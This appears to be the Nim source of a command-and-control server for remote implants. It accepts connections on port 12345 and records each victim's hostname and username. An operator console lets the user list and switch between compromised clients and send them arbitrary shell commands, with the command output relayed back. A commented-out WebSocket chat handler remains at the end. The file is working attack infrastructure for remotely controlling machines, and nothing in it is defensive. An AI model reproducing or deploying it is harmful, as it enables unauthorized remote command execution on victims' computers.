import asyncdispatch, asyncnet, threadpool
import strutils, terminal

import asyncdispatch, asynchttpserver, ws, asyncfutures

import types, logging

proc newServer(): C2Server =
  C2Server(socket: newAsyncSocket(), clients: @[])

var server = newServer()
infoLog "server initialized"

var clResp: Future[void]

proc processMessages(server: C2Server, client: Client) {.async.} =
  while true:
    let line = await client.socket.recvLine()
    
    let args = line.split(":")
    let argsn = len(args)

    if line.len == 0:
      
      cDisconnected(client)
      
      client.connected = false
      client.socket.close()
      return
    if line == "connect":
      await client.socket.send("hi\r\n")
    if line == "pong":
      echo "pong from " & $client
    if line.startsWith("INFO:"):
      server.clients[client.id].loaded = true
      server.clients[client.id].hostname = args[1]
      server.clients[client.id].username = args[2]
    if line.startsWith("OUTPUT:"):
      logClientOutput client, args[1], args[2]
      if not clResp.isNil():
        clResp.complete()
        clResp = nil

    # for c in server.clients:
    #   if c.id != client.id and c.connected:
    #     await c.socket.send(line & "\c\l")

proc acceptSocketClients(port = 12345) {.async.} =
  server.socket.bindAddr(port.Port)
  server.socket.listen()
  
  infoLog "listening on localhost:" & intToStr(port)
  
  while true:
    let (netAddr, clientSocket) = await server.socket.acceptAddr()
    
    let client = Client(
      socket: clientSocket,
      netAddr: netAddr,
      id: server.clients.len,
      connected: true,
      loaded: false,
      hostname: "placeholder",
      username: "placeholder"
    )

    cConnected(client)

    server.clients.add(client)
    asyncCheck processMessages(server, client)

proc procStdin() {.async.} =
  var handlingClient: int = -1

  prompt(handlingClient, server)
  var messageFlowVar = spawn stdin.readLine()
  while true:
    if messageFlowVar.isReady():
      
      let cmd = ^messageFlowVar
      let args = cmd.split(" ")
      let argsn = len(args)

      if cmd == "clients":
        for client in server.clients:
          if client.connected:
            stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
          else:
            stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
          infoLog $len(server.clients) & " clients currently connected"
      if cmd.startsWith("switch"):
        for client in server.clients:
          if client.id == parseInt(args[1]):
            handlingClient = parseInt(args[1])
        if handlingClient != parseInt(args[1]):
          infoLog "client not found"
      if cmd.startsWith("ping"):
        for client in server.clients:
          if client.id == parseInt(cmd.split(" ")[1]):
            echo "pinging " & $client
            await client.socket.send("ping\r\n")
      if cmd.startsWith("info"):
        for client in server.clients:
          if client.id == handlingClient:
            echo @client
      if cmd.startsWith("shell"):
        for client in server.clients:
          if client.id == handlingClient:
            await client.socket.send("CMD:" & args[1..(argsn - 1)].join(" ") & "\r\n")
            if clResp.isNil():
              clResp = newFuture[void]()
              await clResp
      if cmd == "back": 
        handlingClient = -1

      prompt(handlingClient, server)
      messageFlowVar = spawn stdin.readLine()
      
    await asyncdispatch.sleepAsync(100)

# var connections = newSeq[WebSocket]()

# proc cb(req: Request) {.async, gcsafe.} =
#   if req.url.path == "/ws":
#     try:
#       var ws = await newWebSocket(req)
#       connections.add ws
#       await ws.send("Welcome to simple chat server")
#       while ws.readyState == Open:
#         let packet = await ws.receiveStrPacket()
#         echo "Received packet: " & packet
#         for other in connections:
#           if other.readyState == Open:
#             asyncCheck other.send(packet)
#     except WebSocketClosedError:
#       echo "Socket closed. "
#     except WebSocketProtocolMismatchError:
#       echo "Socket tried to use an unknown protocol: ", getCurrentExceptionMsg()
#     except WebSocketError:
#       echo "Unexpected socket error: ", getCurrentExceptionMsg()
#   await req.respond(Http200, "Hello World")

# var httpServer = newAsyncHttpServer()


asyncCheck procStdin()
asyncCheck acceptSocketClients()
# asyncCheck httpServer.serve(Port(9001), cb)

runForever()